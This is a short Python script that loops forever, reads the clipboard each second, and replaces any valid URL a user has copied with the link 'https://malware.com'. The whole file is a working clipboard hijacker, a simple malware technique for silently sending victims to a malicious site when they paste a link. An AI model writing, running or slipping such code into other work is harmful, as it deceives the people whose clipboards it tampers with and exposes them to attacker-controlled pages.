import pyperclip, validators, time

while True: 
    domainExistant = validators.url(pyperclip.paste())
    if domainExistant is True:
        fauxDomaine = "https://malware.com"
        pyperclip.copy(fauxDomaine)

    time.sleep(1)